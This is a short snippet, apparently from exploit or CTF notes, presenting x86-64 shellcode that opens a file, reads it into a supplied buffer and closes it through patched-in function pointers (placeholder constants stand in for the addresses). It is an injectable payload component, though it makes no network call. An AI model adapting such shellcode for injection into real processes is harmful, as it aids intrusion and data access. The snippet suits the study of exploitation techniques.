Final Working shellcode's asm:

```asm
push   rbp
mov    rbp,rsp
sub    rsp,0x50
mov    QWORD PTR [rbp-0x48],rdi
mov    QWORD PTR [rbp-0x50],rsi
movabs rax,0xaaaaaaaaaaaaaaaa
mov    QWORD PTR [rbp-0x18],rax
movabs rax,0xbbbbbbbbbbbbbbbb
mov    QWORD PTR [rbp-0x20],rax
movabs rax,0xcccccccccccccccc
mov    QWORD PTR [rbp-0x28],rax
mov    rax,QWORD PTR [rbp-0x48]
push   0x00000072 ; to create the string "r" for file read mode
mov    rsi,rsp
mov    rdi,rax
mov    rax,QWORD PTR [rbp-0x18]
call   rax
mov    QWORD PTR [rbp-0x8],rax
cmp    QWORD PTR [rbp-0x8],0x0 ; if no file was found
jne    0x5e
mov    eax,0xffffffff
jmp    0x8e
mov    rdx,QWORD PTR [rbp-0x8]
mov    rax,QWORD PTR [rbp-0x50]
mov    rcx,rdx
mov    edx,0xa2800
mov    esi,0x1
mov    rdi,rax
mov    rax,QWORD PTR [rbp-0x20]
call   rax
mov    rax,QWORD PTR [rbp-0x8]
mov    rdi,rax
mov    rax,QWORD PTR [rbp-0x28]
call   rax
mov    rax,0x1 ; if file was read into buffer, just set to 1
leave
ret
```
